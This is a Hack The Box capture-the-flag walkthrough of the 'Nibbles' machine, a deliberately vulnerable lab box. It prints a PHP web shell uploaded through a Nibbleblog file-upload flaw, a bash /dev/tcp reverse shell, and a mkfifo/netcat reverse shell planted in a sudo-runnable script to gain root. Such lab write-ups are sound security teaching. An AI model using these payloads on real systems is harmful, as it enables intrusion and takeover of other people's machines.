## Owning User

Let's start up with the usual Nmap port scan.

> `~ ❯❯❯ nmap -sC -sV 10.10.10.75`

```bash

Looks like we have a webserver. Let's fire up our browser and have a look.

![10.10.10.75](/static/images/nibbles-hack-the-box-writeup/10.10.10.75.png)

Hello to you too! A simple `view-source` reveals an interesting directory:

```html
<b>Hello world!</b>


<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Navigating to the new directory, we find an empty blog.

![nibbleblog](/static/images/nibbles-hack-the-box-writeup/nibbleblog.png)

Let's try to `dirb` for any suspicious files within this 'empty' blog.

> `~ ❯❯❯ dirb http://10.10.10.75/nibbleblog/`

```bash

The `admin.php` page seems interesting; we should have a look.

![admin](/static/images/nibbles-hack-the-box-writeup/admin.png)

A login screen. Let's give it some guessing shots to see if we can get lucky.

After a few tries, we notice that there's some sort of WAF, blacklisting users after consecutive failed authentication attempts.

![blacklist](/static/images/nibbles-hack-the-box-writeup/blacklist.png)

A few minutes later, we were able to retry.

The credentials `admin` for username and `nibbles` for password did the job, saving us from the trouble of bruteforcing our way in (using some dynamic proxy). Of course, it's Hack The Box; the machine's name always comes in handy at some point.

After conducting some research, we come accross a nibbleblog vulnerability: [CVE-2015-6967](https://seclists.org/fulldisclosure/2015/Sep/5). It turns out that we can upload any `php` script as an image in the "My image" plugin section. 

A dead simple php script should do the job:

```php
<?php

echo shell_exec($_GET['e']);
```

Once we upload our 'image' onto the bloggin platform, we can navigate to [10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php](http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=id) to see that we are now able to execute commands through our url bar!

![id](/static/images/nibbles-hack-the-box-writeup/id.png)

Evidently, we now have 'nibbler' privileges (i.e. user privileges). So, let's pop a reverse shell.

Firstly, we should create a file containing our reverse shell script inside the `/tmp/` directory, where we should logically have the appropriate permissions. 

```bash
10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=/bin/echo "/bin/bash -i %3E%26 /dev/tcp/10.10.15.174/443 0%3E%261" > /tmp/reverse.txt
```

Subsequently, let's ensure that we have execute permissions to run the temporary file using `chmod 777`.

```bash
10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=/bin/chmod 777 /tmp/reverse.txt
```

Finally, we can now fire up a listener on our local device using `netcat`  and execute our reverse shell file.

```bash
10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=/bin/bash /tmp/reverse.txt/
```

We should now have a shell as user "nibbler":

> `root@kali:~/# nc -vlp 443`

```bash
listening on [any] 443 ...
connect to [10.10.15.174] from 10.10.10.75 [10.10.10.75] 39002
bash: cannot set terminal process group (1335): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
```

We can subsequently navigate to the `/home/` directory where we can retrieve our first flag:

> `nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler`

> `nibbler@Nibbles:/home/nibbler/$ cat user.txt`

```bash
{USER_HASH_GOES_HERE}
```

## Owning Root

Taking a look at the contents of nibbler's home directory, we can also find a zip folder called `personal.zip`. Let's try unzipping it.

> `nibbler@Nibbles:/home/nibbler/$ ls`

```bash
personal.zip
user.txt
```

> `nibbler@Nibbles:/home/nibbler/$ unzip personal.zip`

```bash
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

The archive inflated a new file called `monitor.sh`. Let's navigate to its directory.

> `nibbler@Nibbles:/home/nibbler/$ cd personal/stuff`

> `nibbler@Nibbles:/home/nibbler/personal/stuff/$ ls -la`

```bash
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

The file contains a bash script called [tecmint_monitor.sh](https://github.com/atarallo/TECMINT_MONITOR/blob/master/tecmint_monitor.sh) which, according to the creator, "monitors linux health"; that's beside the point though. Now, let's modify the contents of the file into a reverse shell script and try to run it as `root`. 

> `nibbler@Nibbles:/home/nibbler/personal/stuff/$ sed -i d monitor.sh`

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff/$ echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.174 7777 > /tmp/f" >> monitor.sh
```

> `nibbler@Nibbles:/home/nibbler/personal/stuff/$ sudo -u root monitor.sh`

We should make sure to open up a listener on the same port before running the above command and wait to see if we can get a connection.

> `root@kali:~/Desktop# nc -vlp 7777`

```bash
listening on [any] 7777 ...
connect to [10.10.15.174] from 10.10.10.75 [10.10.10.75] 49104
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

And there we have it! We now have root priviliges. Let's extract our `root.txt` hash.

```bash
# cd /root
# ls
root.txt
# cat root.txt
{ROOT_HASH_GOES_HERE}
```

I hope you enjoyed this walkthrough! Make sure to stay tuned for more *Hack The Box* writeups coming up soon!
